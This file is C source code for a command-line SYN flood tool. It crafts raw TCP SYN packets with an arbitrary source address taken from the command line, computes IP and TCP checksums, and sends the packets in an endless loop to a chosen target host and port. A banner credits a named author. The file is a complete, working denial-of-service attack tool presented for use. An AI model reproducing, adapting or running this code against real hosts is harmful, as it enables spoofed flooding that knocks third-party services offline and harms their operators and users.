#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define DEFAULT_PORT 1

unsigned int hostname2ip(const char *hostname)
{
	struct hostent *host;
	static struct in_addr i;
	i.s_addr = inet_addr(hostname);
	if(i.s_addr == -1)
	{
		host = gethostbyname(hostname);
		if(host == NULL)
		{
			printf("Host not fount\n");
			exit(1);
		}
		bcopy(host->h_addr, (char *)&i.s_addr, host->h_length);
	}
	return i.s_addr;
}


unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while(nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if(nbytes == 1)
	{
		oddbyte = 0;
		*((u_char *)&oddbyte) = *(u_char *)ptr;
		sum += oddbyte;
	}
	
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}

void flood(unsigned int src_host, unsigned int dst_host, unsigned short port)
{
	struct
	{
		struct iphdr ip;
		struct tcphdr tcp;
	} packet;
	
	struct
	{
		unsigned int source_address;
		unsigned int dest_address;
		unsigned char placeholder;
		unsigned char protocol;
		unsigned short tcp_length;
		struct tcphdr tcp;
	} pseudo_header;

	int sock, sinlen;
	struct sockaddr_in sin;
	
	printf("Precreating packet...\n");
	
	packet.ip.ihl = 5;
	packet.ip.version = 4;
	packet.ip.tos = 0;
	packet.ip.tot_len = htons(40);
	packet.ip.id = getpid();
	packet.ip.frag_off = 0;
	packet.ip.ttl = 255;
	packet.ip.protocol = IPPROTO_TCP;
	packet.ip.check = 0;
	packet.ip.saddr = src_host;
	packet.ip.daddr = dst_host;

	packet.tcp.source = getpid();
	packet.tcp.dest = htons(port);
	packet.tcp.seq = getpid();   
	packet.tcp.ack_seq = 0;
	packet.tcp.res1 = 0;
	packet.tcp.doff = 5;
	packet.tcp.fin = 0;
	packet.tcp.syn = 1;
	packet.tcp.rst = 0;
	packet.tcp.psh = 0;
	packet.tcp.ack = 0;
	packet.tcp.urg = 0;
	packet.tcp.window = htons(512);
	packet.tcp.check = 0;
	packet.tcp.urg_ptr = 0;

	sin.sin_family = AF_INET;
	sin.sin_port = packet.tcp.source;
	sin.sin_addr.s_addr = packet.ip.daddr;   


	printf("Creating socket...\n");
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		printf("Can't create socket!\n");
		exit(1);
	}

	printf("Flooooooooooooooooooooooding...\n");
	for(;;)
	{
		packet.tcp.source++;
		packet.ip.id++;
		packet.tcp.seq++;
		packet.tcp.check = 0;
		packet.ip.check = 0;

		packet.ip.check = in_cksum((unsigned short *)&packet.ip, 20);

		pseudo_header.source_address = packet.ip.saddr;
		pseudo_header.dest_address = packet.ip.daddr;
		pseudo_header.placeholder = 0;
		pseudo_header.protocol = IPPROTO_TCP;
		pseudo_header.tcp_length = htons(20);
		bcopy((char *)&packet.tcp, (char *)&pseudo_header.tcp, 20);
		packet.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
		sinlen = sizeof(sin);
		sendto(sock, &packet, 40, 0, (struct sockaddr *)&sin, sinlen);
	}
	close(sock);
}

int main(int argc, char *argv[])
{
	unsigned int srchost, dsthost;
	unsigned short port; 

	printf("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n+++++++++++++++++++~~== S Y N F L O O D ==~~+++++++++++++++++++++++\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n+++++++ coded by: Dominik Hackl [ dominik@hackl.dhs.org ] +++++++++\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n");

	if(argc < 3)
	{
		printf("Too few arguments!\n%s SOURCE TARGET [ PORT ]\n", argv[0]);
		exit(1);
	}

	printf("Resolving hostnames...\n");
	srchost = hostname2ip(argv[1]);
	dsthost = hostname2ip(argv[2]);

	if(argc < 4 || (port = atoi(argv[3])) == 0)
	{
		printf("No port specified, using port %u\n", DEFAULT_PORT);
		port = DEFAULT_PORT;
	}

	flood(srchost, dsthost, port);

	return 0;
}



